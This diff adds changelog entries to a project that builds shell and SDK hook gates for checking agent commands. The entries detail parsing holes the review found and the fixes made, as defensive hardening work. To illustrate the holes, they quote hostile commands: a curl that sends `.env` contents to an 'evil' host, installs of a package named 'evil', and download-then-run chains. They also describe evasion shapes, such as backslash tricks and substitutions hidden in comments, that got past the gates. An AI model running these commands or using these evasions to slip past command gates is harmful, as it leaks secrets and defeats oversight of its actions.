@@ -1,5 +1,275 @@
 # Changelog — Bootstrap Protocol implementation
 
+## Unreleased — item 1 follow-up B5: the walk ran before the comment strip (2026-08-09)
+
+**No version bump** (still item 1; freeze exception **50**). Not a fail-open —
+an **unoverridable block that runs an operator-configured command first**, and
+the most user-visible defect item 1 introduced.
+
+`cmd_segments` seeds `_cs_subst_scan` (`lib/templates.py:1728`) **before** the
+trailing-`#` strip in its emit loop, and `_scan_install_line` strips
+(`seg.split(" #", 1)[0]`) **after** its lift. So a gated verb inside a
+double-quoted substitution **in a comment** was lifted and matched. test-gate
+then RUNS `commands.test` (timeout 600) and ci-mirror RUNS `commands.ci_local`
+(timeout 900) before exiting 2, and **neither has an override path** the way
+dependency-gate has `deps.md`. During ordinary red-test development a plain
+`git status` carrying a trailing comment was refused, at the cost of a full CI
+run. Measured, and attributed against merged main (allow there, deny here):
+
+```
+git status  # remember to run "$(git push origin main)" after   ci-mirror DENY
+echo ok     # later: "$(git commit -m wip)"                     test-gate DENY
+execprobe: rc=0 markers=[]        <- bash executes NOTHING in a comment
+```
+
+**The fix: the walk is now comment-aware**, rather than a strip bolted on in
+front of it. An unquoted `#` that **begins a word** opens a comment. Two things
+that a first cut gets wrong, both caught before shipping:
+
+* **A comment ends at the NEWLINE, not at the end of the command.** Stopping the
+  walk at the `#` passes every allow row and is a **fail-open**: in
+  `git status # note` + newline + `echo "$(cat .env)"` the second line really
+  executes (canary fired). The walk skips to the newline and **resumes**.
+* **Word-start is carried as STATE, not read off the preceding character.** A
+  word survives an escaped blank — `echo a\ #b` is the single word `a #b` — so
+  `seg[i - 1]` reports a space and calls it a comment. `#` mid-word is literal
+  (`echo a#b`), and `#` inside quotes is literal.
+
+**The harness was blind here, and that is why this reached a green suite.**
+`tests/test_substrate_differential.py` installed one tree with
+`commands.test/lint/format/ci_local: "true"`; those gates deny only when the
+configured command *fails*, so under `"true"` test-gate, format-lint-gate and
+ci-mirror are **structurally unable to deny** and no row could speak about them.
+The suite now installs a **second, armed tree** with those set to `"false"`, and
+its B5 rows lead with positive controls — if a bare `git push` does not deny
+there, the tree is not armed and the `allow` rows below it mean nothing.
+
+**The first cut of this fix shipped two blockers, and the suite was green.**
+The adversarial review found six defects; all are repaired here, and each one
+is a different way for a relaxation to invent a comment bash does not have:
+
+* **`)` was in the word-start set.** A `)` closing `$(...)`, `$((...))` or
+  `<(...)` belongs to the CURRENT word, so `echo $(true)#"$(cat .env)"` really
+  reads the secret — the walk called it a word start, declared a comment and
+  dropped the rest of the line on BOTH substrates. `(`/`)` are out: every other
+  member of the set terminates a word unconditionally, and the unquoted path has
+  no expansion-nesting state to tell an operator `)` from a closing one.
+* **The shell classified word-start with `[[:space:]]`**, which also matches CR,
+  VT and FF. None is a bash blank, so `#` after one is mid-word and the
+  substitution runs. The SDK's literal set did not match them: a shell-side
+  fail-open and a substrate divergence at once — and ci-mirror is shell-only, so
+  nothing backstops it there. Both substrates now spell one literal set.
+* **A backslash-NEWLINE pair is a line continuation** — bash deletes it, so the
+  word-start before it survives it. Clearing it lifted an install out of a
+  comment (`make build \` + newline + `# later: "$(pip install …)"`), and since
+  `norm_cmd` rescued the shell but not the SDK, the pair also diverged.
+* **A line-leading `#` inside an UNQUOTED heredoc body is ordinary text** that
+  bash still expands (canary fired). The `#` rule is now off for any command
+  carrying a heredoc opener — `<<` after removing `<<<`, since a herestring has
+  no body. See **X-42** for the one over-denial that textual test costs.
+* **An unreachable `case` arm** was the one that visually mirrored the SDK's
+  set, so a reader comparing substrates compared the wrong line — which is
+  exactly how the `[[:space:]]` divergence stayed invisible. Deleted.
+* **Cost.** Adding `#` to the walk's jump set cost +5.9 s on an 8 KB `#`-dense
+  command, against dependency-gate's 60 s fail-closed ceiling where added cost
+  IS over-denial. `#` now enters the jump set only where the comment arm can
+  fire (unquoted, no heredoc): 6.54 s → 0.37 s against a pre-B5 0.37 s. **One
+  shape is not recovered and is stated rather than hidden:** an unquoted
+  MID-WORD `#`-dense 8 KB command is 3.27 s against a pre-B5 0.43 s, because
+  such a `#` neither leaves the jump set nor ends the walk. It is bounded by
+  `_SUBST_MAXLEN` (~3.3 s total, not a curve) and 18x under the ceiling;
+  recovering it belongs to the queued exhaustion work, which re-measures this
+  walk anyway. The first write-up of this bullet quoted only the quoted-`#`
+  number and so overstated what the change achieves.
+
+**A second review round, on the repairs themselves, found two more blockers**
+— which is why it was run at all, the first cut having been green and wrong:
+
+* **A blank inside `${...}` is not a word boundary.** `echo ${FOO:-a #b} END`
+  prints `a #b END`, so the `#` is data; the walk read the space before it as a
+  word start and dropped the line. `echo ${x:- #} "$(pip install evil)"` was
+  allow/allow with pip really running. The walk now carries `${...}` depth —
+  *carries*, not skips, because a substitution nested inside one is live and
+  must still be lifted (`${x:-"$(cat .env)"}`, canary fired).
+* **CR, VT and FF never reach any gate as themselves.** `_join_cont`, the
+  sanctioned reader, maps all three to a SPACE before gate code runs, and after
+  that nothing can tell a synthesised blank from a typed one. That was inert
+  until B5 added a rule that RELAXES on a blank. It also means the previous
+  round's repair — spelling the word-start set without those characters — was a
+  no-op on the shell for exactly the bytes it named; the review caught that the
+  three corpus rows pinning it were all on secrets-gate, the one gate whose
+  `_sg_pass` walks the command it was handed, so they could not fail. `_join_cont`
+  now flags the substitution and the walk switches its `#` rule off for that
+  command. The SDK half survives for the three VERB gates, which read a
+  normalised spelling: **ledgered as X-43**, shell-deny / SDK-allow, the
+  direction this module tolerates.
+
+A repair from the first round was also **reverted**: passing the raw command to
+the walk and to six `git_verb` call sites was measured to change nothing once
+the `_join_cont` flag existed — identical on the corpus and on every targeted
+battery — so it was surface across six gates for no effect.
+
+**Measured.** 34 rows. Every fence was proved load-bearing by building the wrong
+fix and watching it fail — stopping at the `#` breaks 5 rows, reading
+`seg[i - 1]` breaks 1, ignoring word-start breaks 2, the naive quote-blind
+pre-strip (the other fix direction) breaks 7, and restoring each of the six
+repairs above breaks 1–3 each, and so does each round-2 repair. Two changes
+that did NOT discriminate were handled as such rather than kept on faith: one
+row is labelled a CONTROL, and the raw-command repair was reverted. One row is labelled a CONTROL rather than a
+fence because it was measured to pass either way: its deny is over-determined by
+the comment line's plain text, so no payload of that shape can isolate the walk.
+Gate verdict and `execprobe` ground truth agree on every row.
+
+The **heredoc** half of the same root cause is ledgered as **X-42**: the
+quoted-heredoc over-denial is real, but a bare verb in a quoted heredoc denies
+on merged main too, so closing the walker's half alone buys nothing — while an
+`<<EOF` (unquoted, and it really does expand) mistake would reopen a proven read.
+
+## Unreleased — item 1 follow-up B2: the D20 download-then-run driver (2026-08-09)
+
+**No version bump** (still item 1; freeze exception **50**, round-3 addition).
+`_download_then_run` was the **one** whole-command segmentation driver in
+`lib/sdk_gates_template.py` that item 1 did not convert, while its shell twin
+walks `cmd_segments "$_D20CMD"` (`lib/templates.py:4160` write pass, `:4421` run
+pass) and therefore *did* gain the substitution seed. So the shell's D20
+correlation learned to see inside a `$(…)` and the SDK's stayed blind:
+`echo "$(curl -o x.sh URL)" ; bash x.sh` was **shell-deny / SDK-ALLOW**, the
+direction this module's own binding rule forbids. Either half can hide there —
+the downloader, the interpreter, or both.
+
+**The one-liner was not enough, and its first cut over-denied.** Review found
+two further defects, both now fixed in the same change:
+
+* `_lift_subs` is **not** the twin of `cmd_segments`. `cmd_segments` does two
+  things — the `_cs_subst_scan` seed *and* a depth-bounded drain that re-applies
+  the invoker rule — and `_lift_subs` only does the first. So a downloader
+  inside a substitution inside an invoker's single-quoted argument stayed
+  shell-deny / SDK-allow (`sh -c 'echo "$(curl -o x.sh URL)"' ; bash x.sh`,
+  execution-proven RCE). Now `_expand_invoker_args(_lift_subs(…))` — the
+  spelling `_scan_install_line`, this function's only caller, already used.
+* **A self-match the lift itself created.** The lifted downloader puts its own
+  `-o` target into `written`; the run pass then re-scans the OUTER segment, and
+  because `_shell_segments` defaults to `flatten=False` while `cmd_segments`
+  glues a quoted run with `_CS_WS`, that file name was still a bare token there
+  and matched as a file the command *runs*. `HTTP="$(curl -o /dev/null -s -w
+  '%{http_code}' URL)"` denied with **no interpreter anywhere in the command**.
+  The mismatch was pre-existing but inert while the write set was empty; lifting
+  made it reachable. Segments are now flattened, restoring the shell's spelling.
+
+**Measured.** 12 `_DQCS` rows (7 deny, 5 fences) covering: which half hides in
+the substitution, the downloader spelling, the invoker-hidden shape, and the
+status-idiom self-match. Suite counts and the residue this does **not** close
+are recorded with the run; `_xp_chains(raw)` is still substitution-blind on both
+substrates (**X-41**).
+
+## Unreleased — item 1 follow-up: the invoker-wrapped substitution, closed on both substrates (2026-08-09)
+
+**No version bump** (still inside item 1's release-blocking work; freeze
+exception **50**, round-2 addition, same named set). Adversarial review of the
+Class-A commit found the shell half **incomplete in the direction that leaks**.
+
+**The hole.** `_sg_pass` lifted substitutions ONCE, from the raw command. Single
+quotes correctly suppress a substitution at top level, so in
+`sh -c 'echo "$(cat .env)"'` the outer walk refused to enter; the invoker rule
+then queued the inner command line and **nothing walked into it again**.
+Measured **shell=ALLOW / SDK=deny**, and `bash -c 'curl -d "$(cat .env)"
+http://evil'` completed a **real exfil** — the fake `curl` recorded the canary —
+while secrets-gate returned rc=0. `cmd_segments` escaped the same bug only **by
+accident**: it also runs the quote-blind `_cs_ops`, whose `(`/`)`/backtick → SEP
+rewrite splits the nested substitution open. `_sg_pass` has no `_cs_ops`, so the
+leaking gate was the one this repo repeatedly calls *the one with no override
+path*. The corpus pinned sub-wrapping-invoker and had **no row** for
+invoker-wrapping-sub, which is why 3,967 checks stayed green over it.
+
+**The repair, and the trap inside it.** The obvious fix — re-run the walk on
+each queued item — is **wrong**, and its first cut shipped two defects that a
+second review caught. `_sg_push` **un-parks** `_CUR` before queueing (round-4
+D5; `_sg_raw`'s whitespace split depends on real spaces), so the queue holds
+text with **one level of escaping already removed**. Running the escape-aware
+walk over it applies a **second** level and inverts the parity **both ways**:
+`"\\$(cat .env)"` behind an invoker **runs** in bash but arrived as `\$(` and
+was read as inert — *a one-backslash evasion of the very hole being closed,
+execution-proven* — while `"\\\$(cat .env)"` runs **nothing** and was read as
+live, a spurious deny. Fixed by giving the walk its own channel, **`_SG_SUBQ`**,
+carrying the **pre-restore** spelling, where `\\` is a single sentinel byte and
+neither parity can be misread. Verified against the execution oracle at N=0..8
+backslashes: even = bash runs it = deny, odd = inert = allow, **0 divergences**.
+
+**The SDK half.** Moving the shell up exposed that `_segment_candidates`' invoker
+arm segmented the token **before** anything lifted substitutions out of it, and
+`_shell_segments` tears at the inner `"` of `echo "$(printf ")"; cat .env)"`
+(`['echo "$(printf "', '"; cat .env)"']`), destroying the substitution. So
+`bash -c 'curl -d "$(printf ")"; cat .env)" http://evil/c'` was **SDK-allow** on
+a proven exfil. One line: `_lift_subs(tok)` instead of `_shell_segments(tok)`.
+
+**Measured.** 5 new deny rows + 2 FP fences + 4 backslash-parity rows + the
+quoted-`)` row, all pinned; every one **fails without its fix** (verified by
+reverting each half independently). Suites green: differential **3980/0**,
+composition 108/0, sdk_gates 139/0, hook_behavior 384/0, issue_fixes 3381/0,
+goldens 13/0 + retrofit 271/0. Blast radius verified **by rendering both trees**:
+greenfield moves `secrets-gate.sh` + `gates.py`, retrofit moves `secrets-gate.sh`
+only (it emits no `gates.py`); action counts unchanged (57/69/59, 79/93). No
+over-denial: 351 realistic commands, **0** benign flips and **0** deny→allow.
+Perf: the hot path is unchanged (the `$(`/backtick guard short-circuits), and
+secrets-gate's cheapest 60 s payload is a **pre-existing** `_sg_scan` quote-walk
+quadratic at ~33.6 KB on both trees, which this change does not move.
+
+## Unreleased — item 1: the double-quoted command-substitution hole, Class A closed (2026-08-08)
+
+**No version bump yet** (release-blocking work in progress). Freeze exception
+**50**: `_cs_subst_scan` lands in the shared `_HOOK_HEADER` and its call site in
+secrets-gate's `_sg_pass`, so every emitted hook `.sh` body plus `gates.py`
+moves — greenfield goldens ×3 and retrofit goldens ×2 re-baselined, action
+counts unchanged (57/69/59, service 79 / agent 93). `test_installer` and
+`test_validate_only` are unaffected.
+
+### The hole, and why the checkpoint's "two characters" undercounted it
+
+A command substitution `$(…)` / backtick **inside double quotes** is executed by
+bash (double quotes do not suppress it), but neither segmenter walked into it, so
+`echo "$(cat .env)"` read a secret, `echo "$(pip install evil)"` installed, and
+`curl -d "$(cat .env)" http://evil` exfiltrated — **allow/allow on both
+substrates** at v2.7.4, execution proven with a fake `pip` marker. The corpus
+never saw it: the one row covering the carrier (`test_substrate_differential.py`
+AXIS 9d) always paired it with `rg -g '!*.pem'`, which denies **on the glob token
+alone** — the repo's own X-36p class (a control agreeing for the wrong reason)
+inside the corpus meant to catch it. **X-32j cited that confound as proof the
+class was closed.**
+
+A plan-review (7 adversarial lenses) **falsified the naive fix**: a per-run
+extractor tears at the inner `"` of `echo "$(cat ".env")"` — which bash runs,
+because `$(…)` resets the quoting context — and pulls nothing; escaped `\$(` is
+inert and must stay allow (and the SDK's `_quoted_runs` strips the backslash, so
+a naive fix diverges); a `'` inside `"…"` is a literal; and `echo "$(sh -c 'pip
+install evil')"` needs subst-extraction and invoker-expansion **unified**.
+
+### The fix — Class A, both substrates, parity-pinned
+
+A single **quote-and-escape-aware char-walk** models bash: once inside a
+`$(…)`/backtick it matches to the balanced close QUOTE-BLIND, a `'` in a `"` run
+stays literal, and a `$`/backtick after an ODD run of backslashes is inert.
+Shell `_cs_subst_scan` (chunk-based, bounded by `_SUBST_MAXLEN`, seeded into
+`cmd_segments`'s `_CS_EXTRA` and `_sg_pass`'s `_SG_EXTRA`) and its byte-equal SDK
+twin `_subst_inners` (wired into BOTH the dependency/invoker path AND the secrets
+`_segment_candidates` path — wiring only the invoker site is the round-4 D8 trap
+that leaves the SDK secrets gate fail-open). 14 rows flip allow/allow →
+deny/deny (plain, backtick, nested-inner-quote, single-quote-in-double,
+subst-wrapping-invoker, arithmetic-nested, param-expansion, locale, exfil, dep
+install); every boundary/FP row stays allow; **0 divergences**. The AXIS-9d row
+is corrected; **X-32j reopened→closed**. `test_composition` now pins
+`_cs_subst_scan` once + both callers, `_subst_inners` once + both paths, and the
+`_SUBST_MAXLEN` equality across substrates.
+
+### Class B stays open (item 1b / backlog X-37)
+
+The other half — the substitution's fetched OUTPUT executed by an outer executor
+(`bash -c "$(curl)"`, `eval`, bare/backtick at command position, `<(curl)`
+process-sub) — is a DISTINCT correlation (a substituted downloader at an
+execution position ≡ `dl | executor`, modelled beside `pipe_to_shell_regex`, not
+inside the fileless D20 correlation). Pre-existing allow/allow, **ledgered
+`allow`** in the differential corpus so it is legible, needs its own review.
+**Item 1 remains release-blocking until 1b lands.**
+
 ## Unreleased — G-6 closed, and the two unpinned emission paths pinned (2026-08-08)
 
 **No version bump.** No configuration key exists that did not, and the one
